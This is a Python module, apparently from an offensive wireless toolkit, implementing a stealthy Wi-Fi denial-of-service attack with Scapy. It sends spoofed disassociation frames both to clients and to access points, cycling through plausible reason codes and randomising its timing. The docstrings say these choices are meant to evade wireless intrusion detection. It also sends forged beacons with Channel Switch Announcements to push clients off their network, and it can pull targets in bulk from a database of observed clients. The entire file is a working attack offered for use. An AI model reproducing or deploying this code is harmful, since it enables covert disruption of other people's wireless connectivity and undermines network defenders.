"""
Client Isolation / Disassociation Engine
-----------------------------------------
Performs subtle client disconnection using disassociation frames (subtype 10)
instead of deauth (subtype 12), making the attack less detectable by WIDS/WIPS.

Features:
  - Uses disassociation (reason codes 1, 4, 5, 8) instead of deauth
  - Varies reason codes to appear more natural
  - Lower frame rate than deauth floods (less detectable)
  - Sends CSA (Channel Switch Announcement) frames to force handoff
  - Targets specific clients to break AP-to-client communication

Platform: Linux only (requires monitor mode).
"""

import time
import random
import threading
from collections import defaultdict

from scapy.all import sendp
from scapy.layers.dot11 import (
    Dot11, Dot11Disas, Dot11Beacon, Dot11Elt, RadioTap
)

from .config import IS_WINDOWS, IS_LINUX, WIFI_BROADCAST, log


# Disassociation reason codes that appear legitimate
DISASSOC_REASONS = {
    1: "Unspecified reason",
    4: "Disassociated due to inactivity",
    5: "Disassociated because AP is unable to handle all associated STAs",
    8: "Disassociated because STA leaving BSS",
}


class ClientIsolationEngine:
    """
    Subtle client isolation engine using disassociation and CSA frames.

    More stealthy than deauth floods - uses varied reason codes, lower rates,
    and channel switch announcements to force clients into handoff mode.
    """

    def __init__(self, interface, db=None):
        self.interface = interface
        self.db = db
        self.running = False
        self._thread = None
        self._handoff_thread = None
        self._targets = defaultdict(set)  # bssid -> {client_mac, ...}
        self._frame_interval = 0.5  # Slower than deauth (more subtle)
        self._reason_cycle = list(DISASSOC_REASONS.keys())
        self._frames_sent = 0
        self._handoff_count = 0

    def add_target(self, client_mac, bssid):
        """Add a specific client-AP pair to target for isolation."""
        self._targets[bssid].add(client_mac)
        log.info(f"Isolation target added: {client_mac} on {bssid}")

    def add_targets_from_db(self, bssid=None):
        """Load targets from database. If bssid given, only that AP's clients."""
        if not self.db:
            log.warning("Isolation: No database available for auto-targeting")
            return
        try:
            if bssid:
                clients = self.db.get_clients_for_bssid(bssid)
                for client_mac, rssi in clients:
                    self._targets[bssid].add(client_mac)
            else:
                ap_clients = self.db.get_all_ap_clients()
                for ap_bssid, clients in ap_clients.items():
                    self._targets[ap_bssid].update(clients)
            total = sum(len(c) for c in self._targets.values())
            log.info(f"Isolation: Loaded {total} targets from {len(self._targets)} APs")
        except Exception as e:
            log.error(f"Isolation: Failed to load targets from DB: {e}")

    def set_frame_interval(self, interval):
        """Set inter-frame interval (higher = more subtle, lower = more aggressive)."""
        self._frame_interval = max(0.1, interval)

    def start(self):
        """Start client isolation attack."""
        if IS_WINDOWS:
            log.warning("Client isolation engine is Linux-only. Skipping on Windows.")
            return False
        if self.running:
            return True
        if not self._targets:
            log.warning("Client isolation: No targets configured")
            return False

        self.running = True
        self._thread = threading.Thread(target=self._disassoc_loop, daemon=True)
        self._thread.start()

        # Start CSA handoff thread
        self._handoff_thread = threading.Thread(target=self._force_handoff, daemon=True)
        self._handoff_thread.start()

        total = sum(len(c) for c in self._targets.values())
        log.info(f"Client isolation started: {total} targets, "
                 f"interval={self._frame_interval}s")
        return True

    def stop(self):
        """Stop client isolation attack."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        if self._handoff_thread:
            self._handoff_thread.join(timeout=5)
        log.info(f"Client isolation stopped. Frames: {self._frames_sent}, "
                 f"Handoffs: {self._handoff_count}")

    def _get_reason_code(self):
        """Get a varied reason code to appear more natural."""
        return random.choice(self._reason_cycle)

    def _craft_disassoc(self, sender, receiver, bssid, reason):
        """Craft a disassociation frame (subtype 10, not deauth subtype 12)."""
        return (
            RadioTap() /
            Dot11(type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid) /
            Dot11Disas(reason=reason)
        )

    def _disassoc_loop(self):
        """
        Main disassociation loop.
        Sends disassoc frames with varied reason codes at a lower rate
        than typical deauth attacks to avoid WIDS detection.
        """
        while self.running:
            try:
                for bssid, clients in list(self._targets.items()):
                    if not self.running:
                        break

                    for client_mac in list(clients):
                        if not self.running:
                            break

                        reason = self._get_reason_code()

                        # Direction 1: AP -> Client (spoofed as AP)
                        frame_ap = self._craft_disassoc(
                            bssid, client_mac, bssid, reason)
                        try:
                            sendp(frame_ap, iface=self.interface,
                                  count=2, inter=0.05, verbose=False)
                            self._frames_sent += 2
                        except Exception as e:
                            log.error(f"Isolation disassoc send error (AP->Client): {e}")

                        # Direction 2: Client -> AP (spoofed as client)
                        # Use different reason code for variety
                        reason2 = self._get_reason_code()
                        frame_client = self._craft_disassoc(
                            client_mac, bssid, bssid, reason2)
                        try:
                            sendp(frame_client, iface=self.interface,
                                  count=2, inter=0.05, verbose=False)
                            self._frames_sent += 2
                        except Exception as e:
                            log.error(f"Isolation disassoc send error (Client->AP): {e}")

                        # Subtle timing - vary the interval slightly
                        jitter = random.uniform(0.8, 1.2)
                        time.sleep(self._frame_interval * jitter)

                # Inter-round pause
                time.sleep(self._frame_interval * 2)

            except Exception as e:
                log.error(f"Isolation loop error: {e}")
                if not self.running:
                    break
                time.sleep(1)

    def _force_handoff(self):
        """
        Force clients into handoff mode by sending CSA (Channel Switch
        Announcement) frames. This makes clients think the AP is switching
        channels, causing them to disconnect and scan for the AP elsewhere.
        """
        while self.running:
            try:
                time.sleep(10)  # CSA less frequently (every 10s)

                if not self.running:
                    break

                for bssid in list(self._targets.keys()):
                    if not self.running:
                        break

                    # Pick a random channel to "switch" to
                    new_channel = random.choice([1, 6, 11, 36, 40, 44])

                    # CSA element: ID=37, Length=3
                    # Mode(1) + New Channel(1) + Count(1)
                    csa_ie = bytes([
                        0,             # Channel Switch Mode (0 = no restriction)
                        new_channel,   # New Channel Number
                        3,             # Channel Switch Count (switch in 3 beacons)
                    ])

                    # Craft beacon with CSA IE (spoofed as target AP)
                    csa_beacon = (
                        RadioTap() /
                        Dot11(type=0, subtype=8,
                              addr1=WIFI_BROADCAST,
                              addr2=bssid,
                              addr3=bssid) /
                        Dot11Beacon(cap="ESS+privacy") /
                        Dot11Elt(ID="SSID", info=b"") /  # Hidden SSID
                        Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96") /
                        Dot11Elt(ID=37, info=csa_ie)  # CSA IE
                    )

                    try:
                        sendp(csa_beacon, iface=self.interface,
                              count=5, inter=0.1, verbose=False)
                        self._handoff_count += 1
                        self._frames_sent += 5
                    except Exception as e:
                        log.error(f"Isolation CSA send error: {e}")

            except Exception as e:
                log.error(f"Isolation handoff error: {e}")
                if not self.running:
                    break
                time.sleep(2)

    def get_stats(self):
        """Return isolation attack statistics."""
        total_targets = sum(len(c) for c in self._targets.values())
        return {
            "targets": total_targets,
            "aps": len(self._targets),
            "frames_sent": self._frames_sent,
            "handoff_attempts": self._handoff_count,
            "frame_interval": self._frame_interval,
            "running": self.running,
        }
